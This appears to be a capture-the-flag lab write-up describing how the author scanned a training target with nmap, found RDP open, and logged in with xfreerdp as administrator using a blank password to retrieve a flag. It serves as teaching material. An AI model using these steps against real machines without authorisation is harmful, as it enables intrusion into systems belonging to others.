# 🖥️ RDP Exploitation – No Password Admin Access

This was a straightforward but satisfying win exploiting an unauthenticated RDP configuration.

---

## 🔍 1. Nmap Enumeration

Initial scan revealed that **RDP (Remote Desktop Protocol)** was open on the target:

```bash
nmap -sV -p- <target-ip>
```

**Result:**
- `3389/tcp open microsoft-rdp`

---

## 🧰 2. Tool Used: `xfreerdp`

Queried help menu to view available options:

```bash
xfreerdp --help
```

This confirmed the necessary flags to attempt login:
- `/u:` – sets the username
- `/v:` – sets the target host

---

## 🔑 3. Attempted Login with No Password

Tried connecting to the RDP service as `administrator` with **no password**:

```bash
xfreerdp /u:administrator /v:10.129.1.13
```

Just **hit enter** when prompted for a password — and it **worked**.

---

## 🖼️ 4. Remote GUI Access & Flag Retrieval

Once the GUI session spawned, it dropped us into a full desktop environment.

- Navigated to `Desktop`
- Found the **flag.txt**
- Opened it, captured the flag, and completed the box

---

## ✅ Summary

| Step               | Command                                      | Description                              |
|--------------------|----------------------------------------------|------------------------------------------|
| Port Discovery     | `nmap -sV -p- <target-ip>`                   | Found RDP on port 3389                   |
| Help Menu          | `xfreerdp --help`                           | Checked usage options                    |
| RDP Login Attempt  | `xfreerdp /u:administrator /v:<target-ip>`  | Connected with no password               |
| Capture Flag       | *GUI login success*                         | Retrieved flag from Desktop              |

---

## 🔐 Lessons Learned

- RDP can be **completely exposed** if no password is set
- `xfreerdp` is a quick and reliable tool for RDP enumeration & access
- Always check GUI desktops for easy flag placement

**Another box down. Easy day. ✅**
